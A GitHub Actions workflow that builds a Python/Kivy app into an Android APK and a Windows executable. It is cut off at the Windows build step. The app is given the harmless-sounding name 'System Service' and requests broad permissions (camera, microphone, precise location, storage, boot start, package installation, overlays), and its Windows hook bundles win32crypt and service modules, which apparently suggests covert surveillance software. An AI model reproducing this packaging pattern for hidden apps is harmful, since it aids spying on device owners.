name: Build Multi-Platform

on:
  push:
    branches: [main, master]
    tags:
      - "v*"
  pull_request:
    branches: [main, master]
  workflow_dispatch:

permissions:
  contents: write
  actions: write

jobs:
  build-android:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.10"

      - name: Cache pip
        uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-android-${{ hashFiles('requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-android-

      - name: Cache Android SDK
        uses: actions/cache@v4
        with:
          path: ~/.buildozer/android/platform
          key: ${{ runner.os }}-android-sdk-${{ hashFiles('buildozer.spec') }}
          restore-keys: |
            ${{ runner.os }}-android-sdk-

      - name: Install system dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            python3-pip \
            python3-dev \
            build-essential \
            git \
            autoconf \
            libtool \
            pkg-config \
            zlib1g-dev \
            libncurses5-dev \
            libncursesw5-dev \
            libtinfo5 \
            cmake \
            libffi-dev \
            libssl-dev \
            openjdk-17-jdk-headless \
            unzip \
            zip \
            libltdl-dev \
            wget \
            curl

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Install Python dependencies
        run: |
          python -m pip install --upgrade pip setuptools wheel
          pip install buildozer==1.5.0
          pip install cython==0.29.37

      - name: Accept Android SDK licenses
        run: |
          mkdir -p $HOME/.android
          touch $HOME/.android/repositories.cfg
          mkdir -p $HOME/.buildozer/android/platform/android-sdk/licenses
          echo "8933bad161af4178b1185d1a37fbf41ea5269c55" > $HOME/.buildozer/android/platform/android-sdk/licenses/android-sdk-license
          echo "d56f5187479451eabf01fb78af6dfcb131a6481e" >> $HOME/.buildozer/android/platform/android-sdk/licenses/android-sdk-license
          echo "24333f8a63b6825ea9c5514f83c2829b004d1fee" >> $HOME/.buildozer/android/platform/android-sdk/licenses/android-sdk-license
          echo "84831b9409646a918e30573bab4c9c91346d8abd" > $HOME/.buildozer/android/platform/android-sdk/licenses/android-sdk-preview-license
          echo "33b6a2b64607f11b759f320ef9dff4ae5c47d97a" >> $HOME/.buildozer/android/platform/android-sdk/licenses/android-sdk-preview-license
          echo "e9acab5b5fbb560a72cfaecce8946896ff6aab9d" > $HOME/.buildozer/android/platform/android-sdk/licenses/android-sdk-arm-dbt-license
          echo "859f317696f67ef3d7f30a50a5560e7834b43903" > $HOME/.buildozer/android/platform/android-sdk/licenses/android-googletv-license
          echo "601085b94cd77f0b54ff86406957099ebe79c4d6" > $HOME/.buildozer/android/platform/android-sdk/licenses/android-sdk-license-2742d1c5
          echo "d975f751698a77b662f1254ddbe6883909f5775a" > $HOME/.buildozer/android/platform/android-sdk/licenses/intel-android-extra-license
          echo "e6a7e62542d6825d7c783e89f2e2154e" > $HOME/.buildozer/android/platform/android-sdk/licenses/mips-android-sysimage-license
          chmod -R 755 $HOME/.buildozer/android/platform/android-sdk/licenses

      - name: Create buildozer spec
        run: |
          buildozer init
          sed -i 's/^title = .*/title = System Service/' buildozer.spec
          sed -i 's/^package.name = .*/package.name = systemservice/' buildozer.spec
          sed -i 's/^package.domain = .*/package.domain = org.example/' buildozer.spec
          sed -i 's/^source.dir = .*/source.dir = ./' buildozer.spec
          sed -i 's/^source.include_exts = .*/source.include_exts = py,png,jpg,kv,atlas,json,txt/' buildozer.spec
          sed -i 's/^version = .*/version = 1.0/' buildozer.spec
          sed -i 's/^requirements = .*/requirements = python3,kivy==2.3.0,pyjnius==1.6.1,requests==2.31.0,cryptography==41.0.7,Pillow==10.1.0,plyer,android/' buildozer.spec
          sed -i 's/^presplash.filename = .*/presplash.filename = %(source.dir)s\/presplash.png/' buildozer.spec
          sed -i 's/^icon.filename = .*/icon.filename = %(source.dir)s\/icon.png/' buildozer.spec
          sed -i 's/^orientation = .*/orientation = portrait/' buildozer.spec
          sed -i 's/^osx.python_version = .*/osx.python_version = 3/' buildozer.spec
          sed -i 's/^osx.kivy_version = .*/osx.kivy_version = 2.3.0/' buildozer.spec
          sed -i 's/^fullscreen = .*/fullscreen = 0/' buildozer.spec
          sed -i 's/^log_level = .*/log_level = 2/' buildozer.spec
          sed -i 's/^warn_on_root = .*/warn_on_root = 1/' buildozer.spec
          sed -i 's/^android.api = .*/android.api = 33/' buildozer.spec
          sed -i 's/^android.minapi = .*/android.minapi = 21/' buildozer.spec
          sed -i 's/^android.ndk = .*/android.ndk = 25b/' buildozer.spec
          sed -i 's/^android.sdk = .*/android.sdk = 34/' buildozer.spec
          sed -i 's/^android.entrypoint = .*/android.entrypoint = main.py/' buildozer.spec
          sed -i 's/^android.arch = .*/android.arch = armeabi-v7a, arm64-v8a/' buildozer.spec
          sed -i 's/^android.allow_backup = .*/android.allow_backup = True/' buildozer.spec
          sed -i 's/^android.permissions = .*/android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,CAMERA,RECORD_AUDIO,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,VIBRATE,WAKE_LOCK,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,SYSTEM_ALERT_WINDOW,REQUEST_INSTALL_PACKAGES/' buildozer.spec
          sed -i 's/^android.features = .*/android.features = android.hardware.camera,android.hardware.camera.autofocus,android.hardware.microphone,android.hardware.location,android.hardware.location.gps,android.hardware.location.network/' buildozer.spec
          sed -i 's/^android.gradle_dependencies = .*/android.gradle_dependencies = /' buildozer.spec
          sed -i 's/^android.add_src = .*/android.add_src = /' buildozer.spec
          sed -i 's/^android.add_jars = .*/android.add_jars = /' buildozer.spec
          sed -i 's/^android.add_aars = .*/android.add_aars = /' buildozer.spec
          sed -i 's/^android.service = .*/android.service = foreground/' buildozer.spec
          sed -i 's/^android.skip_update = .*/android.skip_update = False/' buildozer.spec
          sed -i 's/^android.accept_sdk_license = .*/android.accept_sdk_license = True/' buildozer.spec

      - name: Create dummy icon and presplash
        run: |
          echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > icon.png
          cp icon.png presplash.png

      - name: Build APK with Buildozer
        run: |
          export PATH=$PATH:~/.local/bin
          export ANDROID_HOME="$HOME/.buildozer/android/platform/android-sdk"
          export PATH="$ANDROID_HOME/tools:$ANDROID_HOME/tools/bin:$ANDROID_HOME/platform-tools:$PATH"
          yes | $ANDROID_HOME/tools/bin/sdkmanager --licenses || true
          buildozer -v android debug

      - name: Upload APK artifact
        uses: actions/upload-artifact@v4
        with:
          name: android-apk
          path: |
            bin/*.apk
            *.apk
          retention-days: 30

  build-windows:
    runs-on: windows-latest
    strategy:
      fail-fast: false
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "24"

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.10"

      - name: Cache pip
        uses: actions/cache@v4
        with:
          path: ~\AppData\Local\pip\Cache
          key: ${{ runner.os }}-pip-windows-${{ hashFiles('requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-windows-

      - name: Install Python dependencies
        run: |
          python -m pip install --upgrade pip setuptools wheel
          pip install pyinstaller==6.3.0
          pip install -r requirements.txt
        continue-on-error: true

      - name: Create Kivy hook for PyInstaller
        run: |
          mkdir -p hooks
          echo "from PyInstaller.utils.hooks import collect_data_files, collect_submodules" > hooks/hook-kivy.py
          echo "datas = collect_data_files('kivy')" >> hooks/hook-kivy.py
          echo "hiddenimports = collect_submodules('kivy')" >> hooks/hook-kivy.py
          echo "hiddenimports += ['pkg_resources.py2_warn', 'win32timezone', 'win32api', 'win32com', 'win32com.client', 'win32gui', 'win32process', 'win32security', 'win32net', 'win32crypt', 'win32ts', 'win32event', 'win32file', 'win32pipe', 'win32service', 'servicemanager', 'pythoncom', 'pywintypes']" >> hooks/hook-kivy.py

      - name: Build Windows executable
